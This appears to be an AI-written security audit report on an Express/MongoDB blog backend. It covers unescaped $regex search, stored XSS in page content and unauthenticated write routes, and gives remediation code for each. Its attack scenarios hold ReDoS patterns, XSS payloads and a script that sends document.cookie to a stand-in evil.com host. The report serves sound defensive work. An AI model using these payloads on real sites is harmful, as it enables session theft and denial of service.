# Security Audit Report: post_be Codebase

**Date:** 2026-01-07
**Auditor:** Claude Code Security Agent
**Scope:** XSS & NoSQL Injection Vulnerabilities
**Environment:** Node.js/Express with MongoDB/Mongoose, TypeScript

---

## Executive Summary

Security audit of post_be backend API identified **4 HIGH-RISK** and **3 MEDIUM-RISK** vulnerabilities primarily related to NoSQL Injection and insufficient input validation. Codebase has good baseline XSS protection via security middleware, but critical gaps exist in public-facing search endpoints and unvalidated route handlers.

### Critical Findings
- **4 HIGH-RISK vulnerabilities**: NoSQL injection in public search endpoints, unvalidated content fields
- **3 MEDIUM-RISK vulnerabilities**: Missing validation on critical routes, potential regex DoS
- **Security posture**: Moderate - good middleware implementation undermined by bypasses

---

## Vulnerability Findings

### 🔴 HIGH RISK

#### H-1: NoSQL Injection via Unescaped User Input in $regex (Public Search)
**File:** `/Users/admin/Posts/post_be/src/routes/public-api-routes.ts`
**Lines:** 486-488, 556
**Risk Level:** HIGH
**CWE:** CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)

**Description:**
Public search endpoints directly use user input `q` in MongoDB `$regex` queries without escaping special regex characters. Attacker can inject malicious regex patterns causing:
- Regex DoS (ReDoS) attacks
- Information disclosure via regex patterns
- Database performance degradation

**Vulnerable Code:**
```typescript
// Line 486-488
const query: any = {
  status: 'published',
  $or: [
    { title: { $regex: q, $options: 'i' } },      // VULNERABLE
    { excerpt: { $regex: q, $options: 'i' } },    // VULNERABLE
    { content: { $regex: q, $options: 'i' } },    // VULNERABLE
  ],
};

// Line 556
title: { $regex: q, $options: 'i' },              // VULNERABLE
```

**Attack Scenario:**
```bash
# ReDoS attack - catastrophic backtracking
GET /api/public/search?q=(a+)+$

# Information leakage - boolean regex injection
GET /api/public/search?q=^admin.*
```

**Evidence:**
No input sanitization found. Query parameter `q` passed directly to `$regex` without escaping. `express-mongo-sanitize` middleware (lines 104 in security.middleware.ts) does NOT escape regex special chars - only removes `$` and `.` operators.

**Recommended Fix:**
```typescript
// Escape regex special characters
function escapeRegex(text: string): string {
  return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// Usage
const safeQuery = escapeRegex(q);
const query: any = {
  status: 'published',
  $or: [
    { title: { $regex: safeQuery, $options: 'i' } },
    { excerpt: { $regex: safeQuery, $options: 'i' } },
    { content: { $regex: safeQuery, $options: 'i' } },
  ],
};
```

---

#### H-2: NoSQL Injection in Repository Search Methods
**Files:**
- `/Users/admin/Posts/post_be/src/repositories/post.repository.ts:42-44`
- `/Users/admin/Posts/post_be/src/repositories/user.repository.ts:31-32`
- `/Users/admin/Posts/post_be/src/repositories/category.repository.ts:23-24`
- `/Users/admin/Posts/post_be/src/repositories/author.repository.ts:31-35`
- `/Users/admin/Posts/post_be/src/repositories/tag.repository.ts:64-65`
- `/Users/admin/Posts/post_be/src/repositories/media.repository.ts:27-28`

**Risk Level:** HIGH
**CWE:** CWE-943

**Description:**
Repository layer uses unescaped user input in `$regex` queries. While some routes have validation, search functionality bypasses this.

**Vulnerable Code:**
```typescript
// post.repository.ts:42-44
if (search) {
  query.$or = [
    { title: { $regex: search, $options: 'i' } },    // VULNERABLE
    { slug: { $regex: search, $options: 'i' } },     // VULNERABLE
    { excerpt: { $regex: search, $options: 'i' } },  // VULNERABLE
  ];
}

// user.repository.ts:31-32
$or: [
  { name: { $regex: query, $options: 'i' } },        // VULNERABLE
  { email: { $regex: query, $options: 'i' } },       // VULNERABLE
]
```

**Impact:**
- ReDoS attacks on search functionality
- Performance degradation
- Information disclosure

**Recommended Fix:**
Implement regex escaping utility at repository layer:
```typescript
import { escapeRegex } from '../utils/security.util';

if (search) {
  const safeSearch = escapeRegex(search);
  query.$or = [
    { title: { $regex: safeSearch, $options: 'i' } },
    { slug: { $regex: safeSearch, $options: 'i' } },
    { excerpt: { $regex: safeSearch, $options: 'i' } },
  ];
}
```

---

#### H-3: Unvalidated JSON Content Field (XSS Risk)
**File:** `/Users/admin/Posts/post_be/src/models/page-content.model.ts:34-36`
**Controller:** `/Users/admin/Posts/post_be/src/controllers/page-content-controller.ts:50-60, 76-82, 102-110`
**Routes:** `/Users/admin/Posts/post_be/src/routes/page-content-routes.ts:54, 82, 113, 184`
**Risk Level:** HIGH
**CWE:** CWE-79 (Cross-site Scripting)

**Description:**
PageContent model stores arbitrary JSON in `content` field (Schema.Types.Mixed) with ZERO validation or sanitization. Routes have NO validation middleware. Attacker can inject malicious scripts that execute when frontend renders content.

**Vulnerable Code:**
```typescript
// Model - accepts anything
content: {
  type: Schema.Types.Mixed,
  required: true
}

// Controller - no validation
const { pageSlug, pageName, content } = req.body;
if (!pageSlug || !content) {
  return errorResponse(res, 'pageSlug and content are required', 400);
}

// Routes - NO validation middleware
router.post('/', pageContentController.create);              // NO VALIDATION
router.post('/import', pageContentController.importFromJson); // NO VALIDATION
router.put('/:pageSlug/upsert', pageContentController.upsert); // NO VALIDATION
```

**Attack Scenario:**
```bash
POST /api/page-content
{
  "pageSlug": "malicious-page",
  "content": {
    "header": "<img src=x onerror=alert(document.cookie)>",
    "sections": [{
      "text": "<script>fetch('https://evil.com/steal?data='+document.cookie)</script>"
    }]
  }
}
```

**Impact:**
- Stored XSS attacks
- Session hijacking
- Credential theft
- Malicious redirects

**Recommended Fix:**
1. Add JSON schema validation
2. Sanitize HTML strings recursively in JSON
3. Apply validation middleware

```typescript
// Add middleware
import { body } from 'express-validator';

const pageContentValidation = [
  body('content').custom((value) => {
    // Validate structure and sanitize HTML
    return sanitizePageContent(value);
  })
];

router.post('/', validate(pageContentValidation), pageContentController.create);
```

---

#### H-4: Missing XSS Protection on HTML Content Conversion
**File:** `/Users/admin/Posts/post_be/src/controllers/post-controller.ts:299-314, 321-341`
**Risk Level:** HIGH
**CWE:** CWE-79

**Description:**
Endpoints `/api/posts/:id/structure/parse` and `/api/posts/:id/structure/to-html` accept raw HTML and convert without validation. No XSS middleware applied to these specific routes.

**Vulnerable Code:**
```typescript
// Line 299-314 - accepts raw HTML
parseToStructure = async (req: Request, res: Response): Promise<Response> => {
  const { html } = req.body;  // NO VALIDATION OR SANITIZATION

  if (!html) {
    return errorResponse(res, 'HTML content is required', 400);
  }

  const structure = contentStructureService.parseHtmlToStructure(html);
  return res.json({ success: true, data: structure });
};
```

**Impact:**
- Stored XSS if parsed content saved
- DOM-based XSS during processing

**Recommended Fix:**
Apply XSS middleware before parsing:
```typescript
import { xssProtection } from '../middleware/security.middleware';

router.post('/:id/structure/parse', xssProtection, postController.parseToStructure);
router.post('/:id/structure/to-html', xssProtection, postController.structureToHtml);
```

---

### 🟡 MEDIUM RISK

#### M-1: Insufficient Search Query Length Validation
**File:** `/Users/admin/Posts/post_be/src/middleware/validation.middleware.ts:258-267`
**Risk Level:** MEDIUM
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

**Description:**
Search validation limits query to 200 chars but allows complex regex patterns. Combined with H-1/H-2, enables sophisticated ReDoS attacks.

**Current Validation:**
```typescript
query('search')
  .optional()
  .isString()
  .trim()
  .isLength({ max: 200 })  // TOO PERMISSIVE for regex
  .escape()  // Does NOT escape regex chars
```

**Issue:**
`.escape()` only HTML-escapes but doesn't prevent regex special chars. 200 chars sufficient for complex ReDoS patterns.

**Recommended Fix:**
```typescript
query('search')
  .optional()
  .isString()
  .trim()
  .isLength({ max: 100 })  // Reduce limit
  .matches(/^[a-zA-Z0-9\s\-_áàảãạăắằẳẵặâấầẩẫậéèẻẽẹêếềểễệíìỉĩịóòỏõọôốồổỗộơớờởỡợúùủũụưứừửữựýỳỷỹỵđÁÀẢÃẠĂẮẰẲẴẶÂẤẦẨẪẬÉÈẺẼẸÊẾỀỂỄỆÍÌỈĨỊÓÒỎÕỌÔỐỒỔỖỘƠỚỜỞỠỢÚÙỦŨỤƯỨỪỬỮỰÝỲỶỸỴĐ]+$/)
  .withMessage('Search contains invalid characters')
```

---

#### M-2: Public API Routes Missing Authentication
**File:** `/Users/admin/Posts/post_be/src/routes/page-content-routes.ts`
**Risk Level:** MEDIUM
**CWE:** CWE-862 (Missing Authorization)

**Description:**
All PageContent CRUD routes (create, update, delete) have NO authentication middleware. Any unauthenticated user can modify content.

**Vulnerable Routes:**
```typescript
router.post('/', pageContentController.create);              // NO AUTH
router.post('/import', pageContentController.importFromJson); // NO AUTH
router.put('/:pageSlug/upsert', pageContentController.upsert); // NO AUTH
router.put('/:pageSlug', pageContentController.update);       // NO AUTH
router.delete('/:pageSlug', pageContentController.delete);    // NO AUTH
router.patch('/:pageSlug/toggle-active', pageContentController.toggleActive); // NO AUTH
```

**Compare with Protected Routes:**
```typescript
// post-routes.ts - PROPER PROTECTION
router.post('/', requireAuth, requirePermission('post:create_draft'), validate(...), postController.create);
router.put('/:id', requireAuth, requirePermission('post:edit_own'), validate(...), postController.update);
router.delete('/:id', requireAuth, requirePermission('post:delete'), validate(...), postController.delete);
```

**Impact:**
- Unauthorized content modification
- Content injection
- Data tampering

**Recommended Fix:**
```typescript
import { requireAuth } from '../middleware/auth.middleware';
import { requirePermission } from '../middleware/rbac.middleware';

// GET endpoints can stay public (with activeOnly filter)
router.get('/', pageContentController.getAll);
router.get('/:pageSlug', pageContentController.getBySlug);

// Protect write operations
router.post('/', requireAuth, requirePermission('content:create'), validate(pageContentValidation), pageContentController.create);
router.post('/import', requireAuth, requirePermission('content:import'), validate(pageContentValidation), pageContentController.importFromJson);
router.put('/:pageSlug/upsert', requireAuth, requirePermission('content:edit'), validate(pageContentValidation), pageContentController.upsert);
router.put('/:pageSlug', requireAuth, requirePermission('content:edit'), validate(pageContentValidation), pageContentController.update);
router.delete('/:pageSlug', requireAuth, requirePermission('content:delete'), pageContentController.delete);
router.patch('/:pageSlug/toggle-active', requireAuth, requirePermission('content:edit'), pageContentController.toggleActive);
```

---

#### M-3: Content Field Size Limits Too Permissive
**File:** `/Users/admin/Posts/post_be/src/middleware/validation.middleware.ts:111`
**Model:** `/Users/admin/Posts/post_be/src/models/post.model.ts:153`
**Risk Level:** MEDIUM
**CWE:** CWE-400

**Description:**
Post content limited to 100,000 chars in validation but unlimited in model. Enables resource exhaustion.

**Current State:**
```typescript
// Validation - 100K chars
requiredString('content', 1, 100000),

// Model - NO LIMIT
content: { type: String, required: true },  // UNLIMITED
```

**Recommended Fix:**
```typescript
// Model - add maxlength
content: { type: String, required: true, maxlength: 100000 },
```

---

## Positive Security Controls Found

✅ **Security Middleware** (`security.middleware.ts`):
- Helmet for security headers
- NoSQL injection protection (express-mongo-sanitize)
- XSS protection middleware
- Rate limiting (auth, upload, public API)
- HPP (HTTP Parameter Pollution) protection
- CORS with origin validation

✅ **Input Validation** (partial):
- express-validator on most routes
- ObjectId validation
- Email normalization
- Password strength requirements

✅ **Authentication & Authorization**:
- JWT-based auth
- RBAC middleware
- Protected admin routes

✅ **Dependencies**:
- Using security packages: helmet, sanitize-html, express-mongo-sanitize, xss-clean

---

## Security Gap Analysis

### Bypasses Identified

1. **XSS Middleware Bypass:**
   - Security middleware applied globally (line 64, index.ts)
   - BUT PageContent routes store arbitrary JSON without sanitization
   - Stored XSS persists in database, bypassing request-level XSS protection

2. **NoSQL Sanitization Bypass:**
   - `express-mongo-sanitize` removes `$` and `.` from keys
   - Does NOT escape regex special characters
   - `$regex` queries remain vulnerable

3. **Validation Bypass:**
   - Post routes have validation middleware
   - PageContent routes have NONE
   - Structure endpoints missing validation

---

## Testing Evidence

### Recommended Test Cases

```bash
# Test H-1: NoSQL Injection via Regex
curl "http://localhost:4000/api/public/search?q=(a%2B)%2B%24"
# Expected: Should timeout or hang (ReDoS)
# Fixed: Should return sanitized results quickly

# Test H-2: Repository Search Injection
curl "http://localhost:4000/api/posts?search=%5E%28a%7C%29%2A%24"
# Expected: Performance degradation
# Fixed: Normal response time

# Test H-3: XSS via PageContent
curl -X POST http://localhost:4000/api/page-content \
  -H "Content-Type: application/json" \
  -d '{"pageSlug":"test","content":{"html":"<img src=x onerror=alert(1)>"}}'
# Expected: Stored without sanitization
# Fixed: HTML sanitized or rejected

# Test M-2: Unauthorized Access
curl -X DELETE http://localhost:4000/api/page-content/test-page
# Expected: Success (no auth required)
# Fixed: 401 Unauthorized
```

---

## Remediation Roadmap

### Phase 1: Critical (Immediate - within 24h)

1. **Add regex escaping utility** (H-1, H-2):
   ```typescript
   // src/utils/security.util.ts
   export function escapeRegex(text: string): string {
     return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
   }
   ```

2. **Apply to all $regex queries**:
   - Update public-api-routes.ts
   - Update all repository search methods
   - Add unit tests

3. **Add authentication to PageContent routes** (M-2):
   - Import auth middleware
   - Apply to POST/PUT/PATCH/DELETE routes
   - Define permissions in RBAC

### Phase 2: High Priority (within 72h)

4. **Implement PageContent validation** (H-3):
   - Define JSON schema
   - Create validation middleware
   - Recursive HTML sanitization function
   - Apply to all PageContent routes

5. **Add validation to structure endpoints** (H-4):
   - Apply XSS middleware to parse/to-html routes
   - Validate HTML input
   - Sanitize before storing

### Phase 3: Medium Priority (within 1 week)

6. **Improve search validation** (M-1):
   - Reduce char limit to 100
   - Add pattern validation
   - Implement rate limiting on search

7. **Add content size limits** (M-3):
   - Update Post model with maxlength
   - Add database migration if needed
   - Monitor existing content

### Phase 4: Defense in Depth (ongoing)

8. **Security testing**:
   - Add automated security tests
   - Implement SAST/DAST
   - Regular dependency audits

9. **Monitoring**:
   - Log suspicious regex patterns
   - Alert on repeated failed validations
   - Track search performance metrics

10. **Documentation**:
    - Security coding guidelines
    - Input validation standards
    - Incident response procedures

---

## Implementation Examples

### Example 1: Regex Escaping Utility

```typescript
// src/utils/security.util.ts
/**
 * Escapes special regex characters to prevent ReDoS and injection
 * @param text - User input string
 * @returns Escaped string safe for $regex
 */
export function escapeRegex(text: string): string {
  if (!text || typeof text !== 'string') return '';
  return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/**
 * Recursively sanitizes HTML in JSON objects
 */
export function sanitizeJsonHtml(obj: any): any {
  if (typeof obj === 'string') {
    return sanitizeHtml(obj, { /* options */ });
  }
  if (Array.isArray(obj)) {
    return obj.map(sanitizeJsonHtml);
  }
  if (obj && typeof obj === 'object') {
    const result: any = {};
    for (const [key, value] of Object.entries(obj)) {
      result[key] = sanitizeJsonHtml(value);
    }
    return result;
  }
  return obj;
}
```

### Example 2: PageContent Validation

```typescript
// src/middleware/validation.middleware.ts
export const pageContentValidation = {
  create: [
    body('pageSlug')
      .trim()
      .notEmpty()
      .matches(/^[a-z0-9-]+$/)
      .isLength({ max: 255 })
      .withMessage('Invalid pageSlug'),
    body('pageName')
      .trim()
      .isLength({ min: 1, max: 255 })
      .withMessage('pageName required'),
    body('content')
      .notEmpty()
      .custom((value) => {
        if (typeof value !== 'object') {
          throw new Error('content must be object');
        }
        // Validate structure
        return true;
      })
  ]
};

// src/routes/page-content-routes.ts
import { requireAuth } from '../middleware/auth.middleware';
import { requirePermission } from '../middleware/rbac.middleware';
import { validate, pageContentValidation } from '../middleware/validation.middleware';

router.post('/',
  requireAuth,
  requirePermission('content:create'),
  validate(pageContentValidation.create),
  pageContentController.create
);
```

### Example 3: Safe Repository Search

```typescript
// src/repositories/post.repository.ts
import { escapeRegex } from '../utils/security.util';

async findAllWithFilters(filters: PostFilterDto = {}): Promise<...> {
  const query: FilterQuery<IPost> = {};

  if (search) {
    const safeSearch = escapeRegex(search); // SANITIZE
    query.$or = [
      { title: { $regex: safeSearch, $options: 'i' } },
      { slug: { $regex: safeSearch, $options: 'i' } },
      { excerpt: { $regex: safeSearch, $options: 'i' } },
    ];
  }

  // ... rest of implementation
}
```

---

## Compliance Considerations

**OWASP Top 10 (2021):**
- **A03:2021 – Injection**: H-1, H-2 (NoSQL Injection)
- **A04:2021 – Insecure Design**: M-2 (Missing Auth)
- **A05:2021 – Security Misconfiguration**: H-3 (Unvalidated Input)
- **A07:2021 – Identification and Authentication Failures**: M-2

**CWE References:**
- CWE-79 (XSS): H-3, H-4
- CWE-943 (NoSQL Injection): H-1, H-2
- CWE-862 (Missing Authorization): M-2
- CWE-400 (Resource Exhaustion): M-1, M-3

---

## Unresolved Questions

1. **Frontend Rendering**: How does frontend render PageContent JSON? If using `dangerouslySetInnerHTML` or similar, XSS risk amplified.

2. **Rate Limiting**: General rate limiter disabled (line 74, index.ts). Why? Production deployment security gap?

3. **Content Approval**: Do posts go through editorial review before publishing? Additional XSS defense layer?

4. **Search Performance**: Current search queries scan content field. Are text indexes configured? Performance implications of regex escaping?

5. **RBAC Permissions**: PageContent permissions not defined. Need: `content:create`, `content:edit`, `content:delete`, `content:import`.

6. **Backup/Restore**: If malicious content stored, what's rollback strategy?

7. **CSP Enforcement**: Helmet CSP configured but allows unsafe-inline (line 27, security.middleware.ts). Can this be tightened?

---

## Conclusion

Post_be codebase demonstrates security awareness with comprehensive middleware but critical implementation gaps undermine protections. Immediate action required on 4 HIGH-RISK vulnerabilities, particularly NoSQL injection in public endpoints and unvalidated content storage.

**Estimated Remediation Effort:**
- Phase 1 (Critical): 4-8 hours
- Phase 2 (High): 8-16 hours
- Phase 3 (Medium): 4-8 hours
- Total: 16-32 hours

**Risk Summary:**
Without fixes, system vulnerable to:
- Database compromise via NoSQL injection
- Account takeover via XSS
- Unauthorized content modification
- Service disruption via ReDoS

All vulnerabilities have well-defined fixes. Recommend prioritizing Phase 1-2 before production deployment.
